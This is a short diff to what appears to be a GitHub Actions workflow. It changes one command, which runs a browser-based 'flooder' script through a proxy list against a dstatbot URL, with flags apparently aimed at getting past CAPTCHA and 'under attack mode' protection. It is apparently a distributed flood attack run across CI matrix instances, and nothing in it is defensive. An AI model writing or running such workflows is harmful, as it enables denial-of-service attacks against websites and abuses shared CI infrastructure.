@@ -48,7 +48,7 @@ jobs:
           source ~/.bashrc
 
           mv Fc-main/proxy.txt proxy.txt
-          xvfb-run -a node browser.js https://captcha3.dstatbot.win/9TNIwhiN 700 4 4 proxy.txt --debug true --flooder true
+          xvfb-run -a node browser.js https://uam.dstatbot.win/x0YhClBR 700 4 4 proxy.txt --debug true --flooder true --cookies 2
           
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
